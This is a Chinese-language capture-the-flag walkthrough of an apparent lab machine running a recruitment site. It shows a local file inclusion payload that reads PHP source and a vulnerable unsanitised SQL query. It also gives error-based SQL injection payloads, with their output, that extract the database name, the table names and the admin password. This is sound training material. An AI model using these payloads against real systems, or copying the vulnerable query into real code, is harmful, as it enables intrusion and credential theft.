## 2. 发现 LFI 漏洞

根据 API 的提示，可以推测会存在 **LFI（本地文件包含）漏洞**，据此构造我们的 payload：

```http
http://靶机IP/file.php?cv=file:///var/www/html/file.php
```

## 4. 读取 dashboard.php 发现 SQL 注入

读取 `dashboard.php` 源码后，我们知道在 `search` 这一栏中会存在 **SQL 注入**：

```bash
root@ip-10-49-74-7:~# curl http://10.49.141.114/file.php?cv=file:///var/www/html/dashboard.php
```

关键代码点：

```php
$query = "SELECT * FROM candidates WHERE name LIKE '%$search%'";
```

`search` 参数直接被拼进 SQL 语句且未做过滤，同时错误信息会回显（`SQL Error`），因此存在**报错注入（Error-based SQLi）**。另外源码中还透露出：`hr` 角色对应 `/user.txt`，`admin` 角色对应 `/admin.txt`。

## 5. 利用 SQL 注入提取数据

### 一、获取数据库名称

```sql
' OR extractvalue(1,concat(0x7e,database(),0x7e)) -- -
```

```text
SQL Error:
XPATH syntax error: '~recruit_db~'
```

数据库名为 **`recruit_db`**。

### 二、获取表名称

```sql
' OR extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e)) -- -
```

```text
SQL Error:
XPATH syntax error: '~candidates,users~'
```

共有两张表：**`candidates`**、**`users`**。

### 三、提取 admin 的密码

```sql
' OR extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e)) -- -
```

```text
SQL Error:
XPATH syntax error: '~admin@001admin~'
```

得到 admin 用户的密码：**`admin@001admin`**。

## 6. 登录获取最终 flag

使用提取到的 admin 凭据登录后台，最终获得 flag。

**总结：** 本靶机利用链为 **API 接口泄漏 → LFI 读取源码 → 获取凭据登录 → 源码审计发现 SQL 注入 → 报错注入提取 admin 密码 → 登录获取最终 flag**。
